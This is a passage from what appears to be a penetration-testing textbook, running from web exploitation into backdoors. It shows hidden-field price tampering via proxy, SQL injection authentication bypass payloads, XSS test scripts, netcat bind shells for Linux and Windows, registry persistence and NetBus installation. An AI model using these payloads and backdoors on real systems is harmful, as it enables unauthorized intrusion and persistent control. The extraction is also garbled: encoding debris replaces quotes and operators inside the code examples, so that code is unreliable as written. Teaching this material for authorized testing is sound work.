 Although this assumption is true for a normal user  anyone leveraging the power of a proxy server will have the ability to access  and modify the hidden field
 the classic example of this scenario is the user who was shopping at an online  golf store
 After browsing the selection he decided to buy a driver for $299
  Being a security analyst the astute shopper was running a proxy and noticed  that the website was using a hidden field to pass the value of the driver ($299)  to the server when the e2809cadd to carte2809d button was clicked
 the shopper set up his  proxy to intercept the HttP Post request
 this means when the information  was sent to the server it was stopped at the proxy
 the shopper now had the  ability to change the value of the hidden field
 After manually changing the  value from $299 to $1 the request was sent onto the server
 the driver was  added to his shopping cart and the new total due was $1
 Although this scenario is not as common as it used to be it certainly demon- strates the power of using a proxy to intercept and inspect HttP requests and  responses
 to use webscarab as an interceptor you need to configure your browser to  use a proxy as discussed in the spidering section of this chapter
 once your  browser is configured to use the proxy you can start webscarab by clicking on  the following: k-start dragon e28692 Backtrack e28692 web Application Analysis e28692 web  (front end) e28692 webscarab lite
 You will need to restart webscarab to use the e2809clitee2809d version
 once webscarab  has finished loading you will need to click on the e2809cintercepts tab
e2809d next  you should put a check box in both the e2809cintercept requestse2809d and e2809cintercept  responsese2809d as shown in figure 5
9
 At this point you can use firefox to browse through your target website
 0cThe Basics of hacking and penetration Testing 116 with webscarab set up as described the proxy will stop nearly every transac- tion and allow you to inspect or change the data
 luckily if you find yourself in  this situation webscarab has included a e2809ccancel All interceptse2809d button
 this  can be handy to keep moving forward
 to change the values of a given field wait for webscarab to intercept the  request; then locate the variable you wish to change
 At this point you can  simply enter a new value in the e2809cvaluee2809d field and click the e2809cinserte2809d button to  update the field with the new value
 Viewing HttP response and requests can also be useful for discovering user- name and password information
 Just remember the value in many of these  fields will be Base64 encoded
 Although these values may look as though they  are encrypted you should understand that Base64 is a form of encoding not  encryption
 Although these processes may sound similar they are vastly differ- ent
 decoding Base64 is a trivial task that can be accomplished with little effort  using a program or online tool
 it should be pointed out that there are many good proxy servers available to  assist you with the task of data interception
 do not be afraid to explore other  proxy servers as well
 CODE INJECTION ATTACKS like buffer overflows in system code injection attacks have been a serious issue  in the web world for many years and like buffer overflows there are many  fIGURE 5
9 Setting Up WebScarab to Intercept Requests and Responses
 ALERT! Just a word of warninge28094you may want to leave the Intercept requests and Intercept  responses unchecked until you are ready to test as nearly every page involves these  actions and intercepting everything before you are ready will make your browsing  experience painfully slow
 0cWeb-Based Exploitation ChApTER 5 117 different kinds of code injection attacks
 Broadly defined this class of attacks  could easily fill a chapter
 However because we are focusing on the basics  we will examine the most basic type of code injection: the classic sQl injec- tion
 we will explore the basic commands needed to run an sQl injection and  how it can be used to bypass basic web application authentication
 injection  attacks can be used for a variety of purposes including bypassing authentica- tion manipulating data viewing sensitive data and even executing commands  on the remote host
 most modern web applications rely on the use of interpreted programming  languages and backend databases to store information and generate dynami- cally driven content to the user
 there are many popular interpreted program- ming languages in use today including PHP Javascript AsP structured Query  language (sQl) Python and countless others
 An interpreted language differs  from a compiled language because the interpreted language generates machine  code just before it is executed
 compiled programming languages require the  programmer to compile the source code and generate an executable (
exe) file
  in this case once the program is compiled the source code cannot be changed  unless it is recompiled and the new executable is redistributed
 in the case of modern web applications like an e-commerce site the inter- preted language works by building a series of executable statements that uti- lize both the original programmere28099s work and input from the user
 consider  an online shopper who wants to purchase more rAm for his computer
 the  user navigates to his favorite online retailer and enters the term e2809c16gb rAme2809d in  the search box
 After the user clicks the search button the web app gathers the  usere28099s input (e2809c16gb rAme2809d) and constructs a query to search the backend data- base for any rows in the product table containing e2809c16gb rAm
e2809d Any products  that contain the keywords e2809c16gb rAme2809d are collected from the database and  returned to the usere28099s browser
 Understanding what an interpreted language is and how it works is the key to  understanding injection attacks
 knowing that user input will often be used  to build code that is executed on the target system injection attacks focus on  submitting sending and manipulating user-driven input
 the goal of sending  manipulated input or queries to a target is to get the target to execute unin- tended commands or return unintended information back to the attacker
 the classic example of an injection attack is sQl injection
 sQl is a program- ming language that is used to interact with and manipulate data in a database
  Using sQl a user can read write modify and delete data stored in the database  tables
 recall from our example above that the user supplied a search string  e2809c16gb rAme2809d to the web application (an e-commerce website)
 in this case the  web application generated an sQl statement based off of the user input
 it is important that you understand there are many different flavors of sQl  and different vendors may use different verbs to perform the same actions
  specific statements that work in oracle may not work in mysQl or mssQl
  the information contained below will provide a basic and generic framework  0cThe Basics of hacking and penetration Testing 118 for interacting with most applications that use sQl but you should strive to  learn the specific elements for your target
 consider another example
 Assume that our network admin Ben owned is  searching for a christmas present for his boss
 wanting to make up for many  of his past mistakes Ben decides to browse his favorite online retailer to search  for a new laptop
 to search the site for laptops Ben enters the keywords e2809clap- tope2809d (minus the quotes) into a search box
 this causes the web application to  build an sQl query looking for any rows in the product table that include the  word e2809claptop
e2809d sQl queries are among the most common actions performed  by web applications as they are used to search tables and return matching  results
 the following is an example of a simple sQl query: SELECT * FROM product WHERE category ee80b5 e28098laptope28099; in the statement above the e2809cselecte2809d verb is used to tell sQl that you wish  to search and return results from a table
 the e2809c*e2809d is used as a wildcard and  instructs sQl to return every column from the table when a match is found
  the e2809cfrome2809d keyword is used to tell sQl which table to search
 the e2809cfrome2809d  verb is followed immediately by the actual name of the table (e2809cproducte2809d in this  example)
 finally the e2809cwHeree2809d clause is used to set up a test condition
 the  test condition is used to restrict or specify which rows are to be returned back  to the user
 in this case the select statement will return all the rows from the  product table that contain the word e2809claptope2809d in the e2809ccategorye2809d column
 it is important to remember that in real life most sQl statements you will  encounter are much more complex than this example
 oftentimes an sQl  query will interact with several columns from several different tables in the  same query
 However armed with this basic sQl knowledge let us examine  this statement a little more closely
 we should be able to clearly see that in  our example the user created the value to the right of the e2809cee80b5e2809d sign whereas  the original programmer created everything to the left of the e2809cee80b5e2809d sign
 we  can combine this knowledge with a little bit of sQl syntax to produce some  unexpected results
 the programmer built an sQl statement that was already  fully constructed except for the string value to be used in the wHere clause
  the application accepts whatever the user types into the e2809csearche2809d textbox and  appends that string value to the end of the already created sQl statement
  lastly a final single quote is appended onto the sQl statement to balance the  quotes
 it looks like this when it is all done: SELECT * FROM product WHERE category ee80b5 e28098laptope28099 where SELECT * FROM product WHERE category ee80b5e28098 is created ahead of time  by the programmer while the word laptop is user-supplied and the final e28098 is  appended by the application to balance quotes
 Also notice that when the actual sQl statement was built it included single  quotes around the word e2809claptop
e2809d sQl adds these because e2809ccategorye2809d is a string  datatype in the database
 they must always be balanced that is there must be  0cWeb-Based Exploitation ChApTER 5 119 an even number of quotes in the statement so an sQl syntax error does not  occur
 failure to have both an opening and closing quote will cause the sQl  statement to error and fail
 suppose that rather than simply entering the keyword laptop Ben entered the  following into the search box: laptope28099 or 1 ee80b5 1-- in this case the following sQl statement would be built and executed: b"SELECT * FROM product WHERE category ee80b5 e28098laptope28099 or 1 ee80b5 1--" By adding the extra quote Ben would close off the string containing the user- supplied word of e28098laptope28099 and add some additional code to be executed by the  sQl server namely: or 1 ee80b5 1-- the e2809core2809d statement above is an sQl condition that is used to return records  when either statement is true
 the e2809ce28094e2809d is a programmatic comment
 in most  sQl versions everything that follows the e2809ce28094e2809d is simply ignored by the inter- preter
 the final single quote is still appended by the application but it is  ignored
 this is a very handy trick for bypassing additional code that could  interfere with your injection
 in this case the new sQl statement is saying  e2809creturn all of the records from the product table where the category is e28098laptope28099  or 1 ee80b5 1
e2809d it should be obvious that 1 ee80b5 1 is always true
 Because this is a true  statement sQl will actually return ALL of the records in the product table! the key to understanding how to use sQl injections is to understand the sub- tleties in how the statements are constructed
 on the whole the example above may not seem too exciting; instead of  returning all the rows containing the keyword laptop we were able to return  the whole table
 However if we apply this type of attack to a slightly different  example you may find the results a bit more sensational
 many web applications use sQl to perform authentication
 You gain access to  restricted or confidential locations and material by entering a username and  password
 As in the previous example oftentimes this information is con- structed from a combination of user-supplied input the username and pass- word and programmer-constructed statements
 consider the following example
 the network admin Ben owned has created a  new website that is used to distribute confidential documents to the companye28099s  key strategic partners
 Partners are given a unique username and password to  log into the website and download material
 After setting up his secure website  Ben asks you to perform a penetration test against the site to see if you can  bypass his authentication
 You should start this task by using the same technique we examined to return  all the data in the e2809cproductse2809d table
 remember the e2809ce28094e2809d is a common way of  0cThe Basics of hacking and penetration Testing 120 commenting out any code following the e2809ce28094e2809d
 As a result in some instances it  is possible to simply enter a username followed by the e2809ce28094e2809d sequence
 if inter- preted correctly this can cause the sQl statement to simply bypass or ignore  the section of code that checks for a password and give you access to the  specified user
 However this technique will only work if you already know a  username
 if you do not know the username you should begin by entering the following  into the username textbox: e28098or 1 ee80b5 1-- leaving the username parameter blank and using an expression that will  always evaluate to true is a key way to attack a system when we are unsure of  the usernames required to log into a database
 not entering a username will  cause most databases to simply grab the first user in the database
 in many  instances the first user account in a database is an administrative account
 You  can enter whatever you want for a password (for example e2809csyngresse2809d) as it  will not even get checked by the database because it is commented out
 You do  need to supply a password to bypass client-side authentication (or you can use  your intercepting proxy to delete this parameter altogether)
 SELECT * FROM users WHERE uname ee80b5 e28098e28098or 1 ee80b5 1-- and pwd ee80b5 e28098syngresse28099 At this point you should either have a username or be prepared to access the  database with the first user listed in the database
 if you have a username we  need to attack the password field; here again we can enter the statement: e28098or 1 ee80b5 1-- Because we are using an e2809core2809d statement regardless of what is entered before  the first single quote the statement will always evaluate to true
 Upon examin- ing this statement the interpreter will see that the password is true and grant  access to the specified user
 if the username parameter is left blank but the rest  of the statement is executed you will be given access to the first user listed in  the database
 in this instance assuming we have a username the new sQl statement would  look similar to the following: SELECT * FROM users WHERE uname ee80b5 e28098admine28099 and pwd ee80b5 e28098e28099or 1 ee80b5 1-- in many instances the simple injection above will grant you full access to the  database as the first user listed in the e2809cuserse2809d table
 in all fairness it should be pointed out that it is becoming more uncommon  to find sQl injection errors and bypass authentication using the techniques  listed above
 injection attacks are now much more difficult to locate
 However  this classic example still rears its head on occasion especially with custom- built apps and it also serves as an excellent starting point for learning about  and discovering the more advanced injection attacks
 Openmirrors
com 0cWeb-Based Exploitation ChApTER 5 121 CROSS-SITE SCRIpTING: BROWSERS ThAT   TRUST SITES cross-site scripting also referred to as xss is the process of injecting scripts  into a web application
 the injected script can be stored on the original web  page and run or processed by each browser that visits the web page
 this pro- cess happens as if the injected script was actually part of the original code
 cross-site scripting is different from many other types of attacks as xss  focuses on attacking the client not the server
 Although the malicious script  itself is stored on the web application (server) the actual goal is to get a client  (browser) to execute the script and perform an action
 As a security measure web applications only have access to the data that  they write and store on a client
 this means any information stored on your  machine from one website cannot be accessed by another website
 cross- site scripting can be used to bypass this restriction
 when an attacker is able  to embed a script into a trusted website the victime28099s browser will assume all  the content including the malicious script is genuine and therefore should be  trusted
 Because the script is acting on behalf of the trusted website the mali- cious script will have the ability to access potentially sensitive information  stored on the client including session tokens and cookies
 it is important to point out that the end result or damage caused by a success- ful xss attack can vary widely
 in some instances the effect is a mere annoyance  like a persistent pop-up window whereas other more serious consequences  can result in the complete compromise of the target
 Although many people  initially reject the seriousness of xss a skilled attacker can use the attack to  hijack sessions gain access to restricted content stored by a website execute  commands on the target and even record keystrokes! You should understand that there are numerous cross-site scripting attack vec- tors
 Aside from simply entering code snippets into an input box malicious  hyperlinks or scripts can also be embedded directly into websites e-mails and  even instant messages
 many e-mail clients today automatically render Html  e-mail
 oftentimes the malicious portion of a malicious Url will be obfus- cated in an attempt to appear more legitimate
 in its simplest form conducting a cross-site scripting attack on a web applica- tion that does not perform input sanitization is easy
 when we are only inter- ested in providing proof that the system is vulnerable we can use some basic  Javascript to test for the presence of xss
 website input boxes are an excellent  place to start
 rather than entering expected information into a textbox a pen- etration tester should attempt to enter the script tag followed by a Javascript  e2809calerte2809d directly into the field
 the classic example of this test is listed below:  ee80ac script ee80ae alert(e2809cXSS Teste2809d) ee80ac /script ee80ae  if the above code is entered and the server is vulnerable a Javascript e2809calerte2809d  pop-up window will be generated
 figure 5
10 shows an example of a typical  Openmirrors
com 0cThe Basics of hacking and penetration Testing 122 web page where the user can log in by entering a username and password into  the textboxes provided
 However as previously described rather than entering a normal username and  password enter the test script
 figure 5
11 shows an example of the test xss  before submitting
 After entering our test script we are ready to click the e2809csubmite2809d button
  remember if the test is successful and the web application is vulnerable to  cross-site scripting a Javascript e2809calerte2809d window with the message e2809cxss teste2809d  should appear on the client machine
 figure 5
12 shows the result of our test  providing proof that the application is vulnerable to cross-site scripting
 Just as there are several attack vectors for launching cross-site scripting the  attack itself comes in several varieties
 Because we are covering the basics we  will look at two examples: reflected cross-site scripting and stored cross-site  scripting
 fIGURE 5
11 XSS Test Code
 fIGURE 5
12 XSS Success! fIGURE 5
10 Example of Input Boxes on a Typical Web Page
 Openmirrors
com 0cWeb-Based Exploitation ChApTER 5 123 reflected cross-site scripts occur when a malicious script is sent from the client  machine to a vulnerable server
 the vulnerable server then bounces or reflects  the script back to the user
 in these cases the payload (or script) is executed  immediately
 this process happens in a single response/request
 this type of  cross-site scripting attack is also known as a e2809cfirst order xss
e2809d reflected cross- site scripting attacks are nonpersistent
 thus the malicious Url must be fed to  the user via e-mail instant message and so on so the attack executes in their  browser
 this has a phishing feel to it and rightfully so
 in some instances the malicious script can actually be saved directly on the  vulnerable server
 when this happens the attack is called a stored xss
 Because  the script is saved it gets executed by every user who accesses the web applica- tion
 in the case of stored xss attacks the payload itself (the malicious script  or malformed Url) is left behind and will be executed at a later time
 these  attacks are typically saved in a database or applet
 stored xss does not need  the phishing aspect of reflected xss
 this helps the legitimacy of the attack
 As mentioned earlier cross-site scripting is a very practical attack
 even though  we only examined the simplest of xss attacks do not let this deter you from  learning about the true power of cross-site scripting
 in order to truly master  this content you will need to learn how to harness the power of xss attacks  to steal sessions from your target and deliver the other payloads discussed ear- lier in this section
 once you have mastered both reflected and stored cross-site  scripting attacks you should begin examining and studying dom-based xss  attacks
 hOW DO I pRACTICE ThIS STEp? As mentioned at the beginning of this chapter it is important that you learn to  master the basics of web exploitation
 However finding vulnerable websites on  which you are authorized to conduct these attacks can be difficult
 fortunately  the fine folks at the open web Application security Project (owAsP) organi- zation have developed a vulnerable platform for learning and practicing web- based attacks
 this project called webgoat is an intentionally misconfigured  and vulnerable web server
 webgoat was built using J2ee which means it is capable of running on any  system that has the Java runtime environment installed
 webgoat includes  more than 30 individual lessons that provide a realistic scenario-driven learn- ing environment
 current lessons include all the attacks we described in this  chapter and many more
 most lessons require you to perform a certain attack  like using sQl injection to bypass authentication
 each lesson comes complete  with hints that will help you solve the puzzle
 As with other scenario-driven  exercises it is important to work hard and attempt to find the answer on your  own before using the help files
 if you are making use of virtual machines in your hacking lab you will need  to download and install webgoat inside a virtual machine
 As discussed  0cThe Basics of hacking and penetration Testing 124 previously webgoat will run in either linux or windows just be sure to install  Java (Jre) on your system prior to starting webgoat
 webgoat can be downloaded from the official owAsP website at: http://www
 owasp
org/
 the file you download will require 7zip or a program capable of  unzipping a 
7z file
 Unzip the file and remember the location of the uncom- pressed webgoat folder
 if you are running webgoat on windows you can  navigate to the unzipped webgoat folder and locate the e2809cwebgoat_8080
bate2809d  file
 execute this batch file by double clicking it
 A terminal window will appear;  you will need to leave this window open and running in order for webgoat to  function properly
 At this point assuming that you are accessing webgoat from  the same machine you are running the webgoat server on you can begin using  webgoat by opening a browser and entering the Url: http://127
0
0
1:8080/ webgoat/attack
 if everything went properly you will be presented with a log-in prompt
 Both  the username and password are set to: guest As a final note please pay attention to the warnings posted in the e2809creadmee2809d  file
 specifically you should understand that running webgoat outside of a  lab environment is extremely dangerous as your system will be vulnerable to  attacks
 Always use caution and only run webgoat in a properly sandboxed  environment
 WhERE DO I GO fROM hERE? As has been pointed out several times there is little doubt that this attack vec- tor will continue to grow
 once you have mastered the basics we discussed in  this section you should expand your knowledge by digging in and learning  some of the more advanced topics of web application hacking including client-  side attacks session management source code auditing and many more
 if  you are unsure of what else to study and want to keep up on the latest web- attack happenings keep an eye on the owAsP e2809ctop ten
e2809d the owAsP top ten  Project is an official list of the top web threats as defined by leading security  researchers and top experts
 it should be pointed out that the websecurify tool we discussed earlier in the  chapter is capable of automatically testing for all threat categories listed in the  owAsP top ten Projects! ADDITIONAL RESOURCES You can find the list at http://www
owasp
org website or by searching Google for  e2809cOWASP Top Ten
e2809d You should keep a close eye on this list as it will continue to be  updated and changed as the trends risks and threats evolve
 Openmirrors
com 0cWeb-Based Exploitation ChApTER 5 125 since we are talking about owAsP and they have graciously provided you a  fantastic tool to learn about and test web application security there are many  benefits of joining the owAsP organization
 once you are a member there are  several different ways to get involved with the various projects and continue to  expand your knowledge of web security
 Along with the great webscarab project you should explore other web proxies  as well
 Both the Burp Proxy and Paros Proxy are excellent (and free) tools for  intercepting requests modifying data and spidering websites
 finally there are several great tools that every good web penetration tes- ter should become familiar with
 one of my colleagues and close friends is a  very skilled web app penetration tester and he swears up and down that Burp  suite is the best application testing tool available today
 After reviewing many  web auditing tools it is clear that Burp is indeed a great tool
 A free version  of the Burp suite is built into Backtrack and can be found by clicking on the  k-start dragon e28692 Backtrack e28692 web Application Analysis e28692 web (front end) e28692  Burpsuite if you are not using Backtrack the free version of Burp can be downloaded  from the companye28099s website at: http://portswigger
net/burp/download
html
 SUMMARy Because the web is becoming more and more e2809cexecutablee2809d and because nearly  every target has a web presence this chapter examined web-based exploitation
  the chapter began by reviewing techniques and tools for interrogating web  servers
 the use of nikto and websecurify was covered for locating specific vul- nerabilities in a web server
 exploring the target website by discovering direc- tories and files was demonstrated through the use of a spider
 A method for  intercepting website requests by using webscarab was also covered
 code injec- tion attacks which constitute a serious threat to web security were explored
  specifically we examined the basics of sQl injection attacks
 the chapter con- cluded with a brief discussion and example of cross-site scripting (xss)
 0cThis page intentionally left blank 0c127 INTRODUCTION maintaining access to a remote system is questionable activity and that needs  to be discussed and clearly explained to the client
 many companies are inter- ested in having a penetration test performed but are leery of allowing the pene- tration testing company to make use of backdoors
 most people are afraid that  Maintaining Access  with Backdoors and  Rootkits ChApTER 6 Information in This Chapter: n Netcat: The Swiss Army Knife n Netcate28099s Cryptic Cousin: Cryptcat n Netbus: A Classic n Rootkits n Hacker Defender: It Is Not What You Think n Detecting and Defending Against Rootkits Openmirrors
com 0cThe Basics of hacking and penetration Testing 128 these backdoors will be discovered and exploited by an unauthorized third  party
 imagine that you are the ceo of a company how well would you sleep  knowing that you may have an open backdoor channel into your network?  remember the client sets both the scope and the authorization of the penetra- tion test
 You will need to take the time to fully cover and discuss this step  before proceeding
 still on occasion you may be asked to conduct a penetration test that does  require the use of a backdoor
 whether the reason is to provide a proof of con- cept or simply to create a realistic scenario where the attacker can return to the  target it is important to cover the basics in this step
 in the simplest sense a backdoor is a piece of software that resides on the tar- get computer and allows the attacker to return (connect) to the machine at any  time
 in most cases the backdoor is a hidden process that runs on the target  machine and allows a normally unauthorized user to control the Pc
 it is also important to understand that many exploits are fleeting
 they work  and provide access only as long as the program that was exploited remains run- ning
 in many cases if the target machine reboots or the exploited process is  stopped the shell will be lost
 As a result of this one of the first tasks to com- plete upon gaining access to a system is to migrate your shell to a more perma- nent home
 this is often done through the use of backdoors
 later in the chapter we will discuss rootkits
 rootkits are a special kind of soft- ware that embed themselves deep into the operating system and perform a  number of tasks including giving a hacker the ability to complete hide pro- cesses and programs
 NETCAT: ThE SWISS ARMy KNIfE netcat is an incredibly simple and unbelievably flexible tool that allows com- munication and network traffic to flow from one machine to another
 Although  netcate28099s flexibility makes it an excellent choice for a backdoor there are dozens  of other uses of this tool
 netcat can be used to transfer files between machines  conduct port scans serve as a simple instant messenger/chat and even function  as a simple web server! we will cover the basics here but you should spend  time practicing and playing with netcat
 You will be amazed at what this tool is  capable of
 it is nicknamed the e2809cswiss army knifee2809d for a reason
 netcat was originally written and released by Hobbit in 1996 and supports  sending and receiving both tcP and UdP traffic
 netcat can function in either  a client or server mode
 when it is in client mode the tool can be used to  make a network connection to another service (including another instance of  netcat)
 it is important to remember that netcat can connect from any port  on your local machine to any port on the target machine
 while netcat is run- ning in server mode it acts as a listener where it waits to accept an incoming  connection
 Openmirrors
com 0cMaintaining Access with Backdoors and Rootkits  ChApTER 6 129 let us start with a very basic example of how we can use netcat
 in this exam- ple we will set up netcat to serve as a communication channel between two  machines
 to set this up on the first machine we simply need to choose a port  and instruct netcat to run in listener mode
 issuing the following command in  a terminal will accomplish this task: nc e28093l e28093p 2323 in the command above e2809cnce2809d is used to invoke the netcat program whereas  the e2809c-le2809d is used to put netcat into a listener mode
 the e2809c-pe2809d is used to specify  the port number we want netcat to listen on
 At this point netcat is running  and waiting to accept an incoming connection on port 2323
 now that we have netcat listening on the first machine we can move to the  second machine
 to make a connection to the listening machine we issue the  following command: nc 172
16
45
132 2323 running this command from the second Pc will force netcat to attempt a con- nection to port 2323 on the machine with an iP address of 172
16
45
132
  Because we have set up the first Pc to act as a listener on that port the two Pcs  should now be able to communicate
 we can test this by typing text into either  terminal window
 Anything that we type into the terminal from either machine  will be displayed in the terminal window of both machines
 this is because the  keyboard is acting as the standard input and netcat is simply transporting the  data entered (keystrokes) over the connection
 to end the e2809cchate2809d and close the session we can issue the cntlee80b1c key combi- nation; this will terminate the netcat connection
 figure 6
1 shows an example  of this type of communication between two computers
 it is important to understand that once you kill or close the netcat connec- tion you will need to restart the program on the target machine before  making another connection
 constantly needing to connect to the target  machine to restart netcat is not very efficient
 fortunately if you are using the  windows version of the program netcat provides a way to avoid this issue
  in the windows version of netcat if we start netcat in listener mode using a  e2809c-le2809d (switch) rather than a e2809c-le2809d the target will keep the connection open on  the specified port even after the client disconnects
 in many ways this makes  the program persistent
 of course to make it truly persistent you would need  fIGURE 6
1 Using Netcat to Communicate between Two Computers
 Openmirrors
com 0cThe Basics of hacking and penetration Testing 130 to add the command to run every time the machine starts
 on a windows  machine this could be accomplished by adding the netcat program to the  HKEY_LOCAL_MACHINE\\\\software\\\\microsoft\\\\windows\\\\currentversion\\\\run  registry hive
 Unfortunately in terms of making a persistent network connection the linux  version of netcat is not quite so straightforward
 in order to make the netcat  connection persistent on a linux machine you would have to write a simple  bash script that forces netcat to restart when the original connection is closed
  if you are interested in creating a persistent connection there are many exam- ples to be found on the internet
 Although the example above is an interesting use of netcat and great for dem- onstrating the flexibility and power of the tool in reality you will probably  never use the e2809cchate2809d feature during a penetration test
 on the other hand once  you have got netcat uploaded to your target system there are many practical  uses for the tool
 let us take a look at something a bit more advantageous like  transferring files
 moving files between computers is easy when we have got the meterpreter shell  running but remember we do not want to have to exploit the target every time
  rather the goal is to exploit once and then leave a backdoor so we can return  at a later date
 if we upload netcat to the target we can use the program to  transfer files to and from our target across a network
 for this example assume you want to upload a new file from your local  machine to the target machine
 with netcat running on the target machine we  issue the following command: nc e28093l e28093p 7777 ee80ae calc
exe this command will force the target to listen for an incoming connection on  port 7777
 Any input that is received will be stored into a file named e2809ccalc
exe
e2809d from our local machine we need to use netcat to make a connection to the  target and specify the file we want to send to the target
 we accomplish this by  using the following command: nc 172
16
45
129 7777 ee80ac calc
exe Unfortunately netcat does not provide you any type of feedback letting you  know when the transfer has been completed
 Because you will receive no indi- cation when the upload is done it is best to just wait for a few seconds and  then issue a cntlee80b1c to kill the connection
 At this point you should be able  to run the e2809clse2809d command on your target machine and see the newly created  file
 figure 6
2 shows an example of this process
 naturally you could set up a netcat connection to pull files from the target  machine by reversing the commands above
 oftentimes during a penetration test you will discover open ports that provide  little or no additional information
 You may run across situations where both  Openmirrors
com Openmirrors
com 0cMaintaining Access with Backdoors and Rootkits  ChApTER 6 131 nmap and nessus are unable to discover the service behind the port
 in these  cases it is often very beneficial to use netcat to make a blind connection to the  port
 once you have made the connection you begin sending information to  the port by typing on the keyboard
 in some instances the keyboard input will  elicit a response from the service
 this response may be helpful in allowing you  to identify the service
 consider the following example: Assume you are conducting a penetration test on a target server
 during the  scanning process you discover that port 50001 is open
 Unfortunately nei- ther your port scanner nor your vulnerability scanners were able to determine  what service was running behind the report
 in this case it can be handy to use  netcat to interact with the unknown service
 to force netcat to attempt a con- nection to the service we simply enter the following command: nc 172
16
45
129 50001 this command will attempt to create a tcP connection to the port and service
  it is important to note that you can force netcat to send UdP packets by issu- ing the e2809c-ue2809d switch
 once the connection is made in most cases it is easiest to  simply enter some text and hit return key to send the text to the service
 if the  service responds to the unexpected request you may be able to derive its func- tion
 figure 6
3 shows an example of this
 As you can see we used netcat to create a connection to port 50001
 once con- nected the text e2809cteste2809d was sent through the connection
 the service returned  with a response that clearly indicates that the mysterious service is a web server
  fIGURE 6
2 Using Netcat to Transfer Files
 fIGURE 6
3 Using Netcat to Interrogate Unknown Services
 Openmirrors
com 0cThe Basics of hacking and penetration Testing 132 And even more important the server has fully identified itself as an Apache  server running version 2
2
9 on a linux Ubuntu machine! finally we can use netcat to bind itself to a process and make that process  available over a remote connection
 this allows us to execute and interact  with the bound program as if we were sitting at the target machine itself
 if we  start netcat using the e2809c-ee2809d switch it will execute whatever program we specify  directly after the e2809c-e
e2809d the program will execute on the target machine and will  only run once a connection has been established
 the e2809c-ee2809d switch is incredibly  powerful and very useful for setting up a backdoor shell on a target
 to set up a backdoor we will need to utilize the e2809c-ee2809d switch to bind a com- mand shell from the target machine to a port number
 By setting up netcat in  this manner later when we initiate a connection to the specified port the pro- gram listed after the e2809c-ee2809d switch will run
 if we are using a linux machine we  can accomplish this by typing the following into a terminal window: nc e28093l e28093p 12345 e28093e /bin/sh this will cause the target to serve up a shell to whoever connects to port 12345
  Again any commands sent from the netcat client to the target machine will be  executed locally as if the attacker were sitting at the target
 this technique can also be used on a windows machine
 to provide command  line backdoor access into a windows machine we would run the following on  the target (in a terminal window): nc
exe e28093L e28093p 12345 c:\\\\Windows\\\\System32\\\\cmd
exe to put the preceding example into context and hopefully make it more con- crete for you let us examine the following scenario to show how we could  implement netcat as a backdoor
 consider the following example: assume that  we have successfully exploited a windows target
 Being forward-thinking pen- etration testers we decide to create a more stable backdoor to this system so  that we can return later
 in this case we have decided to use netcat as our back- door software
 the first order of business would be to upload netcat to the target machine; in  this example the netcat executable has been uploaded to the targete28099s System32  directory
 let us assume that we utilized the knowledge gained from chapter  4 and we are currently using the meterpreter shell to interact with our target
  ALERT! Notice because this is a Windows machine we are using the e2809c-Le2809d switch to make  our connection persistent
 If we close the connection from our machine Netcat will  continue listening on the specified port
 The next time we connect to the machine   the cmd shell will be waiting and will execute for us
 0cMaintaining Access with Backdoors and Rootkits  ChApTER 6 133 once we have a meterpreter shell on our target we can upload the netcat file  to the victim by issuing the following command: meterpreter ee80ae upload nc
exe c:\\\\\\\\windows\\\\\\\\system32 Note: You will need to upload the windows (
exe) version of netcat because  the target is running windows
 in this case we have uploaded the nc
exe program to the windows\\\\system32  directory
 this will allow us to access the cmd
exe program directly
 once  netcat has been transferred to the target machine we need to choose a port  number bind the cmd
exe program and start netcat in server mode
 this  will force netcat to wait for an incoming connection on the specified port
 to  perform these tasks we need to issue the following command in a terminal  (again assuming you are already in the same directory as netcat)
 meterpreter ee80ae nc e28093L e28093p 5777 e28093e cmd
exe At this point netcat should be running on our target machine
 remember if  you were interested in making this backdoor truly persistent with the ability to  survive a reboot you would need to set the netcat command to automatically  start in the windows registry
 now that netcat is set up we can close our meterpreter shell and make a connec- tion to the target using netcat
 figure 6
4 shows an example of a connection we  have made from our local Backtrack machine to the target windows machine
 there should be little doubt in your mind that netcat is a truly powerful and  flexible tool
 in this section we have barely scratched the surface
 if you take  some time to dig deeper into the program you will find that people have been  able to perform some rather amazing things using netcat
 You are encouraged  to look into some of these clever implementations by searching the web the  results will amaze you
 NETCATe28099S CRypTIC COUSIN: CRypTCAT Although netcat provides some amazing qualities the program does have a  few shortcomings
 first off it is important to understand that all traffic passed  between a netcat client and server is done so in clear text
 this means that any- one viewing traffic or sniffing the connection will be able to view and monitor  fIGURE 6
4 Using Netcat as a Backdoor on a Windows Machine
 Openmirrors
com 0cThe Basics of hacking and penetration Testing 134 all the information sent between the machines
 cryptcat was introduced  to address this issue
 cryptcat utilizes twofish encryption to keep the traffic  between the client and the server confidential
 the beauty of cryptcat is that you do not need to learn any new commands
  if you have already mastered netcat then you have already mastered cryptcat;  but with cryptcat you have the added benefit of transporting your data using  an encrypted tunnel
 Anyone viewing or analyzing your network traffic will not  be able to see your information
 one important note about cryptcat you should always change the default key
  if you fail to change the default key anyone will have the ability to decrypt your  session
 the default key is: metallica and can be changed using the e2809c-ke2809d switch
 to set up an encrypted tunnel between two machines using cryptcat you can  issue the following commands: 1) start the server: cyrptcat e28093l e28093p 5757 2) start the client: cryptcat 172
16
45
129 5757 You now have an encrypted tunnel set up between the two machines
 figure 6
5  shows an example of this process
 NETBUS: A CLASSIC netbus is a classic piece of software that has been around since 1998
 we will  briefly review it here as a gentle introduction to backdoors and remote control  software
 netbus was originally written by carl-fredrik
 the program consists  of two parts: a client and a server
 the server software is installed on the target  Pc that is the machine that you want to remotely control
 the client software  is used to connect and control the target
 once the netbus server software is installed on the target machine the client  software can perform a number of different actions on the target
 remember  even though the attacker is not physically sitting at the local machine the cli- ent software allows the attacker to execute commands on the remote target as if  he were
 some of the more popular options include the following: n opening the cd-rom drive; n starting a program; fIGURE 6
5 Using Cryptcat to Create an Encrypted Tunnel between Two Machines
 0cMaintaining Access with Backdoors and Rootkits  ChApTER 6 135 n taking a screenshot of the targete28099s current screen; n uploading and downloading files; n sending messages
 to use netbus simply install the server on the target machine and run the cli- ent software on the attacker machine
 netbus comes as a compressed file that contains several different pieces
 You  need to first unzip the netbus file
 to install the server software you will need  to execute the patch
exe file on the target
 this installs and starts netbus
 the  program will run as a process called e2809cpatch
exee2809d and when installed will auto- matically create a registry entry so that it starts every time windows is started
 to access the client panel you run the netBus
exe
 enter the target iP address  in the e2809cHost name/iP:e2809d field and click the connect button
 figure 6
6 shows an  example of the client interface that is used to interact with the target
 there is little doubt that netbus is an old piece of software but it makes for a  great tool when discovering and exploring backdoor command and control of  a remote target
